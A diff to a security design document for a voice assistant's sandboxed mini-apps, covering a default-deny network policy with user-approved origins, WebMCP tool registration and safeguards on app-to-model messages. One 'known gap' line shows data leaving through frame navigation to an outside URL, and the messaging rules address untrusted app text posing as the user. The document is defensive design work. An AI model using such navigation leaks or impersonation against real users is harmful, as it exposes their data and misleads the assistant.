@@ -45,7 +45,7 @@ An untrusted mini-app executes arbitrary HTML, CSS, and JavaScript. The sandbox 
 │ │ │ Origin: "null" (Opaque Sandbox Origin)                         │ │ │
 │ │ │                                                                │ │ │
 │ │ │ • Verifies event.source === window.parent on handshake         │ │ │
-│ │ │ • Registers tools via window.webMcp.registerTool(...)          │ │ │
+│ │ │ • Registers tools via document.modelContext.registerTool(...)  │ │ │
 │ │ │ • Communicates exclusively over transferred MessagePort        │ │ │
 │ │ └────────────────────────────────────────────────────────────────┘ │ │
 │ └────────────────────────────────────────────────────────────────────┘ │
@@ -82,15 +82,44 @@ Verification: `tests/mini-app-relay-policy.test.mjs` drives the real bridge modu
 
 ---
 
-## 3. Authoring Mini-Apps with Web MCP (`window.webMcp`)
+## 2.2 No Network Unless Declared and Allowed (`public/app-network-policy.mjs`, `voicebox-beads-cwx5.16`)
 
-The bridge automatically injects `public/mini-app-sdk.js` into the inner frame right after `<!doctype html>` (preserving `CSS1Compat` Standards Mode). Mini-apps expose interactive tools to the voice assistant using `window.webMcp.registerTool()`:
+The sandbox keeps an app away from the host. It does not keep the user's data away from the internet: until this policy the inner frame ran with no content security policy, so app code could load a script from, or send a tool call's arguments to, any origin.
+
+Every app document now starts with a default-deny CSP, injected as the first element after the doctype (a `<meta>` policy governs only what is parsed after it, so "inside `<head>`" is not early enough; and only a standard `<!doctype html>` behind plain HTML whitespace is kept, because anything else in front, such as a no-break space, would push the policy into the body where it is ignored). With no declaration an app can run its own inline script and style, use `data:` and `blob:` images, and load files from the Voicebox server itself (the built-in apps import their modules from `/apps/`). It cannot fetch, open a socket, load a remote script, submit a form, embed a frame or open a WebRTC connection.
+
+An app that needs an outside origin declares it, using the field names MCP Apps uses for the same idea (`_meta.ui.csp`):
+
+```html
+<script type="application/voicebox-app+json">
+{ "csp": { "connectDomains": ["https://api.example.com"], "resourceDomains": ["https://cdn.jsdelivr.net"] } }
+</script>
+```
+
+| Field | Grants |
+| --- | --- |
+| `connectDomains` | `fetch`, XHR, WebSocket and EventSource to these origins (`connect-src`) |
+| `resourceDomains` | scripts, styles, images, fonts and media from these origins |
+
+Rules for an entry: an `https://` or `wss://` origin, optionally with a port or one leading wildcard label (`https://*.example.com`). Refused, with the reason shown in the app card: `http`/`ws`, a path, query or credentials, an IP address, `localhost`, a bare `*`, a wildcard over a whole top-level domain, and anything past 16 entries per list.
+
+**A declaration is a request, not a grant.** Declarations are often written by a model. The room (`public/components/mini-app-network.mjs`) mounts the app offline and shows a bar in the app card, outside the app's frame, naming every origin, with **Allow** and **Keep offline**. Allow stores the approval in `localStorage` (`voicebox.mini_app_network_approvals.v1`) for that app and that exact set of origins, then remounts the app with the grant. "That app" is where it came from plus what it calls itself (environment or source, then app id or file name), taken before the card collapses apps that share a title, so an app that borrows an approved app's title is still asked. If the browser cannot store the approval it holds for the page session. If the app later asks for a different set, the stored approval no longer matches and the person is asked again. Keep offline lasts until the page is reloaded. The bridge narrows whatever grant it is handed to what the document itself declares, so a grant can never add an origin.
+
+**A blocked load is visible.** The injected SDK listens for `securitypolicyviolation` and the room shows "Blocked: this app tried to reach …", so an app that needs an undeclared CDN says so instead of looking broken.
+
+**Known gap: navigation.** CSP has no directive that stops a frame navigating itself (`location.href = "https://elsewhere/?" + data`, a link click, a meta refresh). The app dies when it does this, but the URL is sent. Closing it needs the bridge to detect the navigation and tear the frame down, or a network-level control; it is tracked as its own bead.
+
+`tests/app-network-policy.test.mjs` pins the parser, the validation and the policy text; `tests/mini-app-network.test.mjs` mounts apps in a real browser, attaches to the sandboxed frame's own target and asserts which hosts its requests actually reached before and after Allow.
+
+## 3. Authoring Mini-Apps with WebMCP (`document.modelContext`)
+
+A Mini-App is a WebMCP page (`voicebox-beads-cwx5.12`). The bridge injects the SDK into the inner frame right after the network policy, and the app registers tools with the API from the [WebMCP draft](https://webmachinelearning.github.io/webmcp/):
 
 ```javascript
-window.webMcp.registerTool({
+await document.modelContext.registerTool({
   name: "set_score",
   description: "Add points to a team on the scoreboard",
-  parameters: {
+  inputSchema: {
     type: "object",
     properties: {
       team: { type: "string", enum: ["home", "away"] },
@@ -98,19 +127,54 @@ window.webMcp.registerTool({
     },
     required: ["team", "points"]
   },
-  execute: async ({ team, points }) => {
+  async execute({ team, points }, { signal }) {
     const el = document.getElementById(`${team}-score`);
     el.textContent = String(Number(el.textContent) + points);
     return { ok: true, currentScore: Number(el.textContent) };
   }
 });
-
-// Signal that tool registration is complete
-window.webMcp.ready();
 ```
 
+What the SDK implements, and where it is narrower than the draft:
+
+| | Behaviour |
+| --- | --- |
+| `registerTool(tool, { signal })` | Returns a promise that settles on the **host's** answer. A duplicate name, a missing description or a schema the host refuses rejects with `InvalidStateError`. |
+| Unregistering | Abort the `signal` passed to `registerTool`; the tool leaves the room's catalogue. |
+| `execute(input, { signal })` | The signal aborts when the host abandons the call (the 5 s bound). |
+| Result | Any JSON value, including a plain string, up to 64 KiB. |
+| Tool name | The host accepts `^[a-zA-Z0-9_-]{1,64}$`, narrower than the draft's 128 characters with `.`; a longer or dotted name is rejected. |
+| `inputSchema` | The strict subset below; an unsupported keyword is a rejection, not a silent drop. |
+| Not implemented | `getTools`, `executeTool`, the `toolchange` events, `outputSchema`, `annotations`, `exposedTo`. |
+
+`document.modelContext` is defined as an own property so it shadows a browser-native implementation: a tool registered with the browser itself would never reach the room. `navigator.modelContext`, the name earlier drafts used, is the same object.
+
+**Older names.** `window.webMcp.registerTool({ ..., parameters })` and `window.webMcp.ready()` (also `window.voicebox`) still work and keep their older behaviour: a synchronous throw on a malformed tool, and a second registration of a name replacing the first. The built-in apps still use them. `tests/mini-app-webmcp-surface.test.mjs` drives both surfaces in a real browser.
+
+### The app can speak first (`public/app-messages.mjs`, `voicebox-beads-cwx5.12`)
+
+A tool call lets the model ask the app. Two SDK calls let the app tell the model, with the meaning MCP Apps gives `ui/message` and `ui/update-model-context`:
+
+```javascript
+await voicebox.updateModelContext({ home: 3, away: 1 });   // the app's current state; each call replaces the last
+await voicebox.sendMessage("The home team scored.");        // the model is told now, and answers
+```
+
+Both return a promise that settles on the room's answer, so the app knows whether the model was told. App code is untrusted and the model holds real tools, so:
+
+| Rule | How |
+| --- | --- |
+| It is never the user's voice | The model receives `[Message from the Mini-App "Title", not from the user. …]` followed by the app's text with every line quoted, so text that imitates the frame stays inside it. It goes straight to the live session and never through the typed-turn path, whose commands act on the host. |
+| It is bounded | 2,000 characters per message, 8,000 per context, 6 delivered messages per minute per mounted app. Each refusal names its reason. |
+| It is visible | The room's session log shows what the app said. |
+| It needs a live session | With no live voice session the promise rejects; nothing is queued. |
+
+**Limit.** `updateModelContext` does not reach the model on its own: the context is held by the room and delivered with the app's next `sendMessage`. A model answering a spoken question learns app state by calling one of the app's tools. Delivering context silently into a running live session differs per provider and is tracked as its own bead.
+
+`tests/app-messages.test.mjs` pins the validation, budget and frame; `tests/mini-app-messages.test.mjs` mounts an app in a real browser and asserts the exact payload handed to the live session.
+
 ### Tool Lifecycle during a Voice Session
-1. **Registration**: The inner app calls `window.webMcp.registerTool(...)`, sending `{ type: "register_tool", tool }` over the private `MessagePort`.
+1. **Registration**: The inner app calls `document.modelContext.registerTool(...)`, sending `{ type: "register_tool", regId, tool }` over the private `MessagePort`; the bridge answers `{ type: "register_result", regId, ok, error }`.
 2. **Schema Validation (`core/mini-app.ts`)**: `validateWebMcpTool()` verifies the tool name (`^[a-zA-Z0-9_-]{1,64}$`), description (≤ 1,024 chars), JSON Schema parameters (`type: "object"`), and per-app tool count (`maxTools: 16`).
 3. **Live Voice Exposure**: `MiniAppRegistry` converts registered tools into function declarations (`toolsToFunctionDeclarations()`) for the active live voice session.
 4. **Voice Execution & Host Argument Validation**: When the user says *"Add three points to the home team"*, the voice model calls `set_score`. The host (`server.mjs`) and outer bridge validate the incoming arguments against the tool's declared JSON schema (`validateMiniAppToolArgs()`). Parameter schemas are strictly validated at registration against an enforceably validated subset:
